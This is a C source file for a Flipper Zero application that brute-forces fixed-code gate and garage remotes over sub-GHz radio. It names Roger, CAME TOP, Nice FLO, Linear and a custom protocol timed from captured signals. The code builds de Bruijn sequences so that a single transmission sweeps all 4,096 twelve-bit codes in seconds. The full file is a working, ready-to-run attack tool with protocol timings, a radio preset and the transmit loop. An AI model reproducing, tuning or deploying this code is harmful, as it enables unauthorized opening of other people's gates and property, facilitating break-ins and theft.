// RF Gate Multi-Brand Brute-force for Flipper Zero
// de Bruijn B(2,n) covers every n-bit code as an overlapping window in 2^n bits.
// Roger, CAME TOP, Nice FLO, Linear 300 MHz, Custom 480µs (measured).
#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_subghz.h>
#include <gui/gui.h>
#include <gui/view_port.h>
#include <input/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ── Protocol table ────────────────────────────────────────────────────────────
typedef struct {
    const char* name;
    uint32_t    freq;
    uint8_t     order;     // de Bruijn order = code bit-width
    uint16_t    sync_on;   // µs
    uint16_t    sync_off;
    uint16_t    bit1_on;
    uint16_t    bit1_off;
    uint16_t    bit0_on;
    uint16_t    bit0_off;
    uint8_t     repeats;   // full-sequence passes
} Protocol;

// Timing values sourced from published protocol specs and Flipper SubGhz
// implementation.  CAME/Nice/Linear values are approximate; adjust if your
// hardware uses a non-standard variant.
// "Custom 480us" timing measured directly from captured RAW signals
// (Gate_inner.sub / Gate_outer.sub): te=480µs, 28-bit fixed code frame,
// inter-frame gap ~11200µs.  12-bit de Bruijn covers the most common
// DIP-switch code widths (4096 combos) in ~3.5 s.
static const Protocol PROTOS[] = {
    // name           freq        ord  sOn   sOff   1on  1off   0on  0off rep
    { "Roger Gate",  433920000,  12,  100,  3100,  600,  200,  200,  600,  1 },
    { "CAME TOP",    433920000,  12,  320,  9100,  320,  640,  640,  320,  3 },
    { "Nice FLO",    433920000,  12,  500,  8500,  500, 1000, 1000,  500,  2 },
    { "Linear 300",  300000000,  10, 1200, 10000,  600, 1200, 1200,  600,  3 },
    { "Custom 480us",433920000,  12,  480, 12000,  960,  480,  480,  960,  3 },
};
#define PROTO_COUNT ((uint8_t)(sizeof(PROTOS) / sizeof(PROTOS[0])))

// ── CC1101 OOK 270 kHz async preset ──────────────────────────────────────────
static const uint8_t PRESET_OOK270[] = {
    0x02, 0x0D,
    0x03, 0x47,
    0x08, 0x32,
    0x0B, 0x06,
    0x14, 0x00,
    0x13, 0x00,
    0x12, 0x30,
    0x11, 0x32,
    0x10, 0x67,
    0x18, 0x18,
    0x19, 0x18,
    0x1D, 0x40,
    0x1C, 0x00,
    0x1B, 0x03,
    0x20, 0xFB,
    0x22, 0x11,
    0x21, 0xB6,
    0x00, 0x00,
    0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// ── De Bruijn B(2,n) — FKM algorithm ─────────────────────────────────────────
#define DB_MAX_ORDER 12
#define DB_MAX_LEN   (1 << DB_MAX_ORDER)

static int     g_db_order;
static uint8_t s_db_a[DB_MAX_ORDER + 1];
static uint8_t s_db_bits[DB_MAX_LEN];
static size_t  s_db_len;

static void db_gen(int t, int p) {
    if(t > g_db_order) {
        if(g_db_order % p == 0) {
            size_t limit = (size_t)(1u << g_db_order);
            for(int i = 1; i <= p && s_db_len < limit; i++)
                s_db_bits[s_db_len++] = s_db_a[i];
        }
    } else {
        s_db_a[t] = s_db_a[t - p];
        db_gen(t + 1, p);
        for(int j = (int)s_db_a[t - p] + 1; j <= 1; j++) {
            s_db_a[t] = (uint8_t)j;
            db_gen(t + 1, t);
        }
    }
}

// ── Async TX ─────────────────────────────────────────────────────────────────
// One pass is allocated on the heap; the callback loops it rep_total times
// so multi-pass protocols need no extra memory.
typedef struct {
    const LevelDuration* seq;
    size_t               pass_len;
    size_t               index;
    uint8_t              rep_cur;
    uint8_t              rep_total;
    FuriSemaphore*       done;
    volatile size_t*     progress;  // written from ISR, read for display only
    volatile bool        signaled;
} TxState;

static LevelDuration tx_callback(void* ctx) {
    TxState* s = ctx;
    if(s->rep_cur >= s->rep_total) {
        if(!s->signaled) {
            s->signaled = true;
            furi_semaphore_release(s->done);
        }
        return level_duration_reset();
    }
    if(s->index < s->pass_len) {
        if(s->progress) *s->progress = s->rep_cur * s->pass_len + s->index;
        return s->seq[s->index++];
    }
    s->rep_cur++;
    s->index = 0;
    if(s->rep_cur < s->rep_total) {
        if(s->progress) *s->progress = s->rep_cur * s->pass_len;
        return s->seq[s->index++];
    }
    if(s->progress) *s->progress = (size_t)s->rep_total * s->pass_len;
    if(!s->signaled) {
        s->signaled = true;
        furi_semaphore_release(s->done);
    }
    return level_duration_reset();
}

// ── App ───────────────────────────────────────────────────────────────────────
typedef enum { STATE_MENU, STATE_TX, STATE_DONE } AppState;

typedef struct {
    FuriMessageQueue* queue;
    FuriMutex*        mutex;
    AppState          state;
    uint8_t           sel;
    volatile size_t   tx_progress;
    size_t            tx_total;
} AppCtx;

static void draw_cb(Canvas* canvas, void* ctx) {
    AppCtx* app = ctx;
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    AppState state = app->state;
    uint8_t  sel   = app->sel;
    size_t   total = app->tx_total;
    furi_mutex_release(app->mutex);
    size_t prog = app->tx_progress;  // volatile; atomic 32-bit read is safe

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    if(state == STATE_MENU) {
        canvas_draw_str(canvas, 2, 10, "RF Gate Brute-Force");
        canvas_set_font(canvas, FontSecondary);
        // Scrolling window: show 4 items centred on selected
        uint8_t first = (sel >= 2) ? (sel - 1) : 0;
        if(first + 4 > PROTO_COUNT) first = (PROTO_COUNT >= 4) ? PROTO_COUNT - 4 : 0;
        for(uint8_t vi = 0; vi < 4 && (first + vi) < PROTO_COUNT; vi++) {
            uint8_t i = first + vi;
            uint8_t y = 21 + vi * 11;
            if(i == sel) {
                canvas_set_color(canvas, ColorBlack);
                canvas_draw_box(canvas, 0, y - 8, 128, 10);
                canvas_set_color(canvas, ColorWhite);
            }
            canvas_draw_str(canvas, 4, y, PROTOS[i].name);
            canvas_set_color(canvas, ColorBlack);
        }
        canvas_draw_str(canvas, 2, 63, "OK:Start  BACK:Exit");

    } else if(state == STATE_TX) {
        canvas_draw_str(canvas, 2, 10, PROTOS[sel].name);
        canvas_set_font(canvas, FontSecondary);
        uint8_t pct = total > 0 ? (uint8_t)((prog * 100) / total) : 0;
        char buf[32];
        snprintf(buf, sizeof(buf), "Sending... %3u%%", pct);
        canvas_draw_str(canvas, 2, 23, buf);
        canvas_draw_frame(canvas, 2, 27, 124, 8);
        if(pct > 0) canvas_draw_box(canvas, 3, 28, (uint8_t)(122 * pct / 100), 6);
        snprintf(buf, sizeof(buf), "%u codes x%u pass",
                 (unsigned)(1u << PROTOS[sel].order), PROTOS[sel].repeats);
        canvas_draw_str(canvas, 2, 44, buf);
        canvas_draw_str(canvas, 2, 57, "BACK to abort");

    } else {
        canvas_draw_str(canvas, 2, 10, PROTOS[sel].name);
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 2, 28, "Done!");
        char buf[28];
        snprintf(buf, sizeof(buf), "%u codes sent.",
                 (unsigned)(1u << PROTOS[sel].order));
        canvas_draw_str(canvas, 2, 40, buf);
        canvas_draw_str(canvas, 2, 55, "BACK to return");
    }
}

static void input_cb(InputEvent* event, void* ctx) {
    AppCtx* app = ctx;
    furi_message_queue_put(app->queue, event, 0);
}

// ── Entry point ───────────────────────────────────────────────────────────────
int32_t roger_gate_app(void* p) {
    UNUSED(p);

    AppCtx app = {
        .queue       = furi_message_queue_alloc(8, sizeof(InputEvent)),
        .mutex       = furi_mutex_alloc(FuriMutexTypeNormal),
        .state       = STATE_MENU,
        .sel         = 0,
        .tx_progress = 0,
        .tx_total    = 0,
    };

    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, draw_cb, &app);
    view_port_input_callback_set(vp, input_cb, &app);
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);
    view_port_update(vp);

    bool running = true;
    while(running) {
        InputEvent ev;
        if(furi_message_queue_get(app.queue, &ev, furi_ms_to_ticks(200)) != FuriStatusOk)
            continue;
        if(ev.type != InputTypeShort) continue;

        if(app.state == STATE_MENU) {
            if(ev.key == InputKeyUp) {
                app.sel = (app.sel > 0) ? app.sel - 1 : PROTO_COUNT - 1;
                view_port_update(vp);
            } else if(ev.key == InputKeyDown) {
                app.sel = (app.sel + 1) % PROTO_COUNT;
                view_port_update(vp);
            } else if(ev.key == InputKeyOk) {
                const Protocol* pr = &PROTOS[app.sel];

                g_db_order = pr->order;
                memset(s_db_a, 0, sizeof(s_db_a));
                s_db_len = 0;
                db_gen(1, 1);

                size_t db_len   = (size_t)(1u << pr->order);
                size_t pass_len = 2 + db_len * 2 + 1;
                LevelDuration* seq = malloc(pass_len * sizeof(LevelDuration));
                if(!seq) continue;

                size_t wi = 0;
                seq[wi++] = level_duration_make(true,  pr->sync_on);
                seq[wi++] = level_duration_make(false, pr->sync_off);
                for(size_t b = 0; b < db_len; b++) {
                    if(s_db_bits[b]) {
                        seq[wi++] = level_duration_make(true,  pr->bit1_on);
                        seq[wi++] = level_duration_make(false, pr->bit1_off);
                    } else {
                        seq[wi++] = level_duration_make(true,  pr->bit0_on);
                        seq[wi++] = level_duration_make(false, pr->bit0_off);
                    }
                }
                seq[wi++] = level_duration_make(true, pr->bit1_on);

                furi_mutex_acquire(app.mutex, FuriWaitForever);
                app.state       = STATE_TX;
                app.tx_progress = 0;
                app.tx_total    = pass_len * pr->repeats;
                furi_mutex_release(app.mutex);
                view_port_update(vp);

                TxState tx = {
                    .seq       = seq,
                    .pass_len  = pass_len,
                    .index     = 0,
                    .rep_cur   = 0,
                    .rep_total = pr->repeats,
                    .done      = furi_semaphore_alloc(1, 0),
                    .progress  = &app.tx_progress,
                    .signaled  = false,
                };

                furi_hal_subghz_reset();
                furi_hal_subghz_load_custom_preset(PRESET_OOK270);
                furi_hal_subghz_set_frequency_and_path(pr->freq);
                furi_hal_subghz_tx();
                furi_hal_subghz_start_async_tx(tx_callback, &tx);

                bool aborted = false;
                while(true) {
                    if(furi_semaphore_acquire(tx.done, furi_ms_to_ticks(50)) == FuriStatusOk)
                        break;
                    view_port_update(vp);
                    InputEvent pev;
                    while(furi_message_queue_get(app.queue, &pev, 0) == FuriStatusOk) {
                        if(pev.type == InputTypeShort && pev.key == InputKeyBack)
                            aborted = true;
                    }
                    if(aborted) break;
                }

                furi_hal_subghz_stop_async_tx();
                furi_hal_subghz_sleep();
                furi_semaphore_free(tx.done);
                free(seq);

                furi_mutex_acquire(app.mutex, FuriWaitForever);
                app.state = aborted ? STATE_MENU : STATE_DONE;
                furi_mutex_release(app.mutex);
                view_port_update(vp);

            } else if(ev.key == InputKeyBack) {
                running = false;
            }

        } else if(app.state == STATE_DONE) {
            if(ev.key == InputKeyBack) {
                furi_mutex_acquire(app.mutex, FuriWaitForever);
                app.state = STATE_MENU;
                furi_mutex_release(app.mutex);
                view_port_update(vp);
            }
        }
    }

    gui_remove_view_port(gui, vp);
    furi_record_close(RECORD_GUI);
    view_port_free(vp);
    furi_mutex_free(app.mutex);
    furi_message_queue_free(app.queue);
    return 0;
}
